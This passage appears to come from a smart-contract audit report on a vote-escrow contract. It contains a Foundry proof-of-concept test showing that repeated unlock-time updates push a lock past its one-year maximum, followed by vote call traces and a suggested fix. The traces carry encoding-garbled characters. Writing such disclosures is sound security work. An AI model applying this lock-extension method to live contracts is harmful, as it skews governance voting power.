    â   ââ€ â [Return] 1885161600 [1.885e9]
    ââ€ [0] VM::stopPrank()
    â   ââ€ â [Return] 
    ââ€ â [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 62.86s (43.31s CPU time)

Ran 1 test suite in 65.46s (62.86s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

### Next, added voting to the test with additional modifications:

Test function modified again:

```solidity
    function testUpdateLockDuration() public {
        hevm.startPrank(admin);

        uint256 tokenId = veALCX.createLock(TOKEN_1, 52 weeks, false); /// @audit added for PoC/testing purposes

        uint256 lockEnd1 = veALCX.lockEnd(tokenId); /// @audit added for PoC/testing purposes

        /// Use this for testing voting power/boost:
        uint256 _boost1 = veALCX.claimableFlux(tokenId) + flux.getUnclaimedFlux(tokenId); /// @audit added for PoC/testing purposes

        address[] memory pools = new address[](1); /// @audit added for PoC/testing purposes
        pools[0] = alETHPool; /// @audit added for PoC/testing purposes
        uint256[] memory weights = new uint256[](1); /// @audit added for PoC/testing purposes
        weights[0] = 5000; /// @audit added for PoC/testing purposes

        //voter.vote(tokenId, pools, weights, _boost1); /// @audit added for PoC/testing purposes.
        uint256 blockTimestamp0 = block.timestamp;

        hevm.warp(block.timestamp + 1 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        uint256 lockEnd2 = veALCX.lockEnd(tokenId); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 2 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        uint256 lockEnd3 = veALCX.lockEnd(tokenId); /// @audit added for PoC/testing purposes
        assertGt(lockEnd2, lockEnd1); /// @audit added for PoC/testing purposes
        assertGt(lockEnd3, lockEnd2); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 3 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 4 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 5 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 6 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 7 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 10 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes

        /// Use this for testing voting power/boost:
        uint256 _boost2 = veALCX.claimableFlux(tokenId) + flux.getUnclaimedFlux(tokenId); /// @audit added for PoC/testing purposes
        //voter.vote(tokenId, pools, weights, _boost2); /// @audit added for PoC/testing purposes.
        uint256 blockTimestamp1 = block.timestamp;

        hevm.warp(block.timestamp + 20 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 30 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 40 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 50 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        hevm.warp(block.timestamp + 51 weeks); /// @audit added for PoC/testing purposes
        veALCX.updateUnlockTime(tokenId, 52 weeks, false); /// @audit added for PoC/testing purposes
        uint256 lockEnd60 = veALCX.lockEnd(tokenId); /// @audit added for PoC/testing purposes
        assertGt(lockEnd60, lockEnd1); /// @audit added for PoC/testing 

        /// Use this for testing voting power/boost:
        uint256 _boost3 = veALCX.claimableFlux(tokenId) + flux.getUnclaimedFlux(tokenId); /// @audit added for PoC/testing purposes
        // assertGt(_boost2, _boost1); /// @audit added for PoC/testing purposes
        // assertGt(_boost3, _boost2); /// @audit added for PoC/testing purposes
        // assertGt(_boost3, _boost1); /// @audit added for PoC/testing purposes

        voter.vote(tokenId, pools, weights, _boost3); /// @audit added for PoC/testing purposes.
        uint256 blockTimestamp2 = block.timestamp; /// @audit added for PoC/testing purposes.
        assertGt(blockTimestamp1, blockTimestamp0); /// @audit added for PoC/testing purposes.
        assertGt(blockTimestamp2, blockTimestamp1); /// @audit added for PoC/testing purposes.

        hevm.stopPrank();
    }
```

### Test results:

The below 3 tests test voting at different epochs or timestamps, as per the modified test function:

#### Testing `voter.vote(tokenId, pools, weights, _boost1);`:

```solidity
    ââ€ [536816] Voter::vote(1, [0xC4C319E2D4d66CcA4464C0c2B32c9Bd23ebe784e], [5000], 978304445704673151 [9.783e17])
    â   ââ€ [5229] VotingEscrow::isApprovedOrOwner(0x8392F6669292fA56123F71949B52d883aE57e225, 1) [staticcall]
    â   â   ââ€ â [Return] true
    â   ââ€ [549] FluxToken::getUnclaimedFlux(1) [staticcall]
    â   â   ââ€ â [Return] 0
    â   ââ€ [3879] VotingEscrow::claimableFlux(1) [staticcall]
    â   â   ââ€ â [Return] 978304445704673151 [9.783e17]
    â   ââ€ [5680] VotingEscrow::balanceOfToken(1) [staticcall]
    â   â   ââ€ â [Return] 1956608891409346303 [1.956e18]
    â   ââ€ [3680] VotingEscrow::balanceOfToken(1) [staticcall]
    â   â   ââ€ â [Return] 1956608891409346303 [1.956e18]
    â   ââ€ [599] VotingEscrow::lockEnd(1) [staticcall]
    â   â   ââ€ â [Return] 1746662400 [1.746e9]
    â   ââ€ [579] VotingEscrow::isMaxLocked(1) [staticcall]
    â   â   ââ€ â [Return] false
    â   ââ€ [29110] FluxToken::accrueFlux(1)
    â   â   ââ€ [3879] VotingEscrow::claimableFlux(1) [staticcall]
    â   â   â   ââ€ â [Return] 978304445704673151 [9.783e17]
    â   â   ââ€ â [Stop] 
    â   ââ€ [3680] VotingEscrow::balanceOfToken(1) [staticcall]
    â   â   ââ€ â [Return] 1956608891409346303 [1.956e18]
    â   ââ€ [269197] Bribe::deposit(2934913337114019454 [2.934e18], 1)
    â   â   ââ€ emit Deposit(from: Voter: [0xaEC4eF6ee02e8334b2FCC86cE0d516F6186EBe2B], tokenId: 1, amount: 2934913337114019454 [2.934e18])
    â   â   ââ€ â [Stop] 
    â   ââ€ emit Voted(voter: 0x8392F6669292fA56123F71949B52d883aE57e225, pool: 0xC4C319E2D4d66CcA4464C0c2B32c9Bd23ebe784e, tokenId: 1, weight: 2934913337114019454 [2.934e18])
    â   ââ€ [24705] VotingEscrow::voting(1)
    â   â   ââ€ â [Stop] 
    â   ââ€ [1053] FluxToken::updateFlux(1, 978304445704673151 [9.783e17])
    â   â   ââ€ â [Stop] 
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1716415391 [1.716e9])
    â   ââ€ â [Return] 
    ââ€ [312313] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1747267200 [1.747e9], maxLockEnabled: false, depositType: 2, ts: 1716415391 [1.716e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1747267200 [1.747e9])
    â   ââ€ â [Stop] 
    ââ€ [599] VotingEscrow::lockEnd(1) [staticcall]
    â   ââ€ â [Return] 1747267200 [1.747e9]
    ââ€ [0] VM::warp(1717624991 [1.717e9])
    â   ââ€ â [Return] 
    ââ€ [404578] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1748476800 [1.748e9], maxLockEnabled: false, depositType: 2, ts: 1717624991 [1.717e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1748476800 [1.748e9])
    â   ââ€ â [Stop] 
    ââ€ [599] VotingEscrow::lockEnd(1) [staticcall]
    â   ââ€ â [Return] 1748476800 [1.748e9]
    ââ€ [0] VM::warp(1719439391 [1.719e9])
    â   ââ€ â [Return] 
    ââ€ [496843] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1750291200 [1.75e9], maxLockEnabled: false, depositType: 2, ts: 1719439391 [1.719e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1750291200 [1.75e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1721858591 [1.721e9])
    â   ââ€ â [Return] 
    ââ€ [589108] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1752710400 [1.752e9], maxLockEnabled: false, depositType: 2, ts: 1721858591 [1.721e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1752710400 [1.752e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1724882591 [1.724e9])
    â   ââ€ â [Return] 
    ââ€ [681373] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1755734400 [1.755e9], maxLockEnabled: false, depositType: 2, ts: 1724882591 [1.724e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1755734400 [1.755e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1728511391 [1.728e9])
    â   ââ€ â [Return] 
    ââ€ [773638] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1759363200 [1.759e9], maxLockEnabled: false, depositType: 2, ts: 1728511391 [1.728e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1759363200 [1.759e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1732744991 [1.732e9])
    â   ââ€ â [Return] 
    ââ€ [865903] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1763596800 [1.763e9], maxLockEnabled: false, depositType: 2, ts: 1732744991 [1.732e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1763596800 [1.763e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1738792991 [1.738e9])
    â   ââ€ â [Return] 
    ââ€ [1142698] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1769644800 [1.769e9], maxLockEnabled: false, depositType: 2, ts: 1738792991 [1.738e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1769644800 [1.769e9])
    â   ââ€ â [Stop] 
    ââ€ [549] FluxToken::getUnclaimedFlux(1) [staticcall]
    â   ââ€ â [Return] 0
    ââ€ [5682] VotingEscrow::claimableFlux(1) [staticcall]
    â   ââ€ â [Return] 978304445704673151 [9.783e17]
    ââ€ [0] VM::warp(1750888991 [1.75e9])
    â   ââ€ â [Return] 
    ââ€ [2057348] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1781740800 [1.781e9], maxLockEnabled: false, depositType: 2, ts: 1750888991 [1.75e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1781740800 [1.781e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1769032991 [1.769e9])
    â   ââ€ â [Return] 
    ââ€ [2979998] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1799884800 [1.799e9], maxLockEnabled: false, depositType: 2, ts: 1769032991 [1.769e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1799884800 [1.799e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1793224991 [1.793e9])
    â   ââ€ â [Return] 
    ââ€ [3906648] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1824076800 [1.824e9], maxLockEnabled: false, depositType: 2, ts: 1793224991 [1.793e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1824076800 [1.824e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1823464991 [1.823e9])
    â   ââ€ â [Return] 
    ââ€ [4831298] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1854316800 [1.854e9], maxLockEnabled: false, depositType: 2, ts: 1823464991 [1.823e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1854316800 [1.854e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1854309791 [1.854e9])
    â   ââ€ â [Return] 
    ââ€ [4923563] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1885161600 [1.885e9], maxLockEnabled: false, depositType: 2, ts: 1854309791 [1.854e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1885161600 [1.885e9])
    â   ââ€ â [Stop] 
    ââ€ [599] VotingEscrow::lockEnd(1) [staticcall]
    â   ââ€ â [Return] 1885161600 [1.885e9]
    ââ€ [549] FluxToken::getUnclaimedFlux(1) [staticcall]
    â   ââ€ â [Return] 0
    ââ€ [5682] VotingEscrow::claimableFlux(1) [staticcall]
    â   ââ€ â [Return] 978304445704673151 [9.783e17]
    ââ€ [0] VM::stopPrank()
    â   ââ€ â [Return] 
    ââ€ â [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 78.14s (55.19s CPU time)

Ran 1 test suite in 82.10s (78.14s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

#### Testing `voter.vote(tokenId, pools, weights, _boost2);`:

```solidity
    ââ€ [541831] Voter::vote(1, [0xC4C319E2D4d66CcA4464C0c2B32c9Bd23ebe784e], [5000], 978288844487017269 [9.782e17])
    â   ââ€ [1229] VotingEscrow::isApprovedOrOwner(0x8392F6669292fA56123F71949B52d883aE57e225, 1) [staticcall]
    â   â   ââ€ â [Return] true
    â   ââ€ [549] FluxToken::getUnclaimedFlux(1) [staticcall]
    â   â   ââ€ â [Return] 0
    â   ââ€ [5682] VotingEscrow::claimableFlux(1) [staticcall]
    â   â   ââ€ â [Return] 978288844487017269 [9.782e17]
    â   ââ€ [7483] VotingEscrow::balanceOfToken(1) [staticcall]
    â   â   ââ€ â [Return] 1956577688974034539 [1.956e18]
    â   ââ€ [5483] VotingEscrow::balanceOfToken(1) [staticcall]
    â   â   ââ€ â [Return] 1956577688974034539 [1.956e18]
    â   ââ€ [599] VotingEscrow::lockEnd(1) [staticcall]
    â   â   ââ€ â [Return] 1769644800 [1.769e9]
    â   ââ€ [579] VotingEscrow::isMaxLocked(1) [staticcall]
    â   â   ââ€ â [Return] false
    â   ââ€ [30913] FluxToken::accrueFlux(1)
    â   â   ââ€ [5682] VotingEscrow::claimableFlux(1) [staticcall]
    â   â   â   ââ€ â [Return] 978288844487017269 [9.782e17]
    â   â   ââ€ â [Stop] 
    â   ââ€ [5483] VotingEscrow::balanceOfToken(1) [staticcall]
    â   â   ââ€ â [Return] 1956577688974034539 [1.956e18]
    â   ââ€ [269197] Bribe::deposit(2934866533461051808 [2.934e18], 1)
    â   â   ââ€ emit Deposit(from: Voter: [0xaEC4eF6ee02e8334b2FCC86cE0d516F6186EBe2B], tokenId: 1, amount: 2934866533461051808 [2.934e18])
    â   â   ââ€ â [Stop] 
    â   ââ€ emit Voted(voter: 0x8392F6669292fA56123F71949B52d883aE57e225, pool: 0xC4C319E2D4d66CcA4464C0c2B32c9Bd23ebe784e, tokenId: 1, weight: 2934866533461051808 [2.934e18])
    â   ââ€ [24705] VotingEscrow::voting(1)
    â   â   ââ€ â [Stop] 
    â   ââ€ [1053] FluxToken::updateFlux(1, 978288844487017269 [9.782e17])
    â   â   ââ€ â [Stop] 
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1750889483 [1.75e9])
    â   ââ€ â [Return] 
    ââ€ [2057348] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1781740800 [1.781e9], maxLockEnabled: false, depositType: 2, ts: 1750889483 [1.75e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1781740800 [1.781e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1769033483 [1.769e9])
    â   ââ€ â [Return] 
    ââ€ [2979998] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1799884800 [1.799e9], maxLockEnabled: false, depositType: 2, ts: 1769033483 [1.769e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1799884800 [1.799e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1793225483 [1.793e9])
    â   ââ€ â [Return] 
    ââ€ [3906648] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1824076800 [1.824e9], maxLockEnabled: false, depositType: 2, ts: 1793225483 [1.793e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1824076800 [1.824e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1823465483 [1.823e9])
    â   ââ€ â [Return] 
    ââ€ [4831298] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1854316800 [1.854e9], maxLockEnabled: false, depositType: 2, ts: 1823465483 [1.823e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1854316800 [1.854e9])
    â   ââ€ â [Stop] 
    ââ€ [0] VM::warp(1854310283 [1.854e9])
    â   ââ€ â [Return] 
    ââ€ [4923563] VotingEscrow::updateUnlockTime(1, 31449600 [3.144e7], false)
    â   ââ€ emit Deposit(provider: 0x8392F6669292fA56123F71949B52d883aE57e225, tokenId: 1, value: 0, locktime: 1885161600 [1.885e9], maxLockEnabled: false, depositType: 2, ts: 1854310283 [1.854e9])
    â   ââ€ emit Supply(prevSupply: 1000000000000000000 [1e18], supply: 1000000000000000000 [1e18])
    â   ââ€ emit UnlockTime(_unlockTime: 1885161600 [1.885e9])
    â   ââ€ â [Stop] 
    ââ€ [599] VotingEscrow::lockEnd(1) [staticcall]
    â   ââ€ â [Return] 1885161600 [1.885e9]
    ââ€ [549] FluxToken::getUnclaimedFlux(1) [staticcall]
    â   ââ€ â [Return] 0
    ââ€ [5682] VotingEscrow::claimableFlux(1) [staticcall]
    â   ââ€ â [Return] 978288844487017269 [9.782e17]
    ââ€ [0] VM::stopPrank()
    â   ââ€ â [Return] 
    ââ€ â [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 76.17s (54.31s CPU time)

Ran 1 test suite in 79.84s (76.17s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

#### Testing `voter.vote(tokenId, pools, weights, _boost3);`:

```solidity
    ââ€ [541831] Voter::vote(1, [0xC4C319E2D4d66CcA4464C0c2B32c9Bd23ebe784e], [5000], 978278570514414615 [9.782e17])
    â   ââ€ [1229] VotingEscrow::isApprovedOrOwner(0x8392F6669292fA56123F71949B52d883aE57e225, 1) [staticcall]
    â   â   ââ€ â [Return] true
    â   ââ€ [549] FluxToken::getUnclaimedFlux(1) [staticcall]
    â   â   ââ€ â [Return] 0
    â   ââ€ [5682] VotingEscrow::claimableFlux(1) [staticcall]
    â   â   ââ€ â [Return] 978278570514414615 [9.782e17]
    â   ââ€ [7483] VotingEscrow::balanceOfToken(1) [staticcall]
    â   â   ââ€ â [Return] 1956557141028829231 [1.956e18]
    â   ââ€ [5483] VotingEscrow::balanceOfToken(1) [staticcall]
    â   â   ââ€ â [Return] 1956557141028829231 [1.956e18]
    â   ââ€ [599] VotingEscrow::lockEnd(1) [staticcall]
    â   â   ââ€ â [Return] 1885161600 [1.885e9]
    â   ââ€ [579] VotingEscrow::isMaxLocked(1) [staticcall]
    â   â   ââ€ â [Return] false
    â   ââ€ [30913] FluxToken::accrueFlux(1)
    â   â   ââ€ [5682] VotingEscrow::claimableFlux(1) [staticcall]
    â   â   â   ââ€ â [Return] 978278570514414615 [9.782e17]
    â   â   ââ€ â [Stop] 
    â   ââ€ [5483] VotingEscrow::balanceOfToken(1) [staticcall]
    â   â   ââ€ â [Return] 1956557141028829231 [1.956e18]
    â   ââ€ [269197] Bribe::deposit(2934835711543243846 [2.934e18], 1)
    â   â   ââ€ emit Deposit(from: Voter: [0xaEC4eF6ee02e8334b2FCC86cE0d516F6186EBe2B], tokenId: 1, amount: 2934835711543243846 [2.934e18])
    â   â   ââ€ â [Stop] 
    â   ââ€ emit Voted(voter: 0x8392F6669292fA56123F71949B52d883aE57e225, pool: 0xC4C319E2D4d66CcA4464C0c2B32c9Bd23ebe784e, tokenId: 1, weight: 2934835711543243846 [2.934e18])
    â   ââ€ [24705] VotingEscrow::voting(1)
    â   â   ââ€ â [Stop] 
    â   ââ€ [1053] FluxToken::updateFlux(1, 978278570514414615 [9.782e17])
    â   â   ââ€ â [Stop] 
    â   ââ€ â [Stop] 
    ââ€ [0] VM::stopPrank()
    â   ââ€ â [Return] 
    ââ€ â [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 80.96s (57.06s CPU time)

Ran 1 test suite in 84.34s (80.96s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

SUGGESTED BUGFIX:

* should take into account the previous update unlock time's `block.timestamp` and therefore the previous update's timestamp for after `MAXTIME` was added, so that we can know how much time was left to use for future unlock time updates, and save that as a state/storage variable which we will use in the `updateUnlockTime()` to ensure our new unlock time extension doesn't exceed the max limit of 365 days.
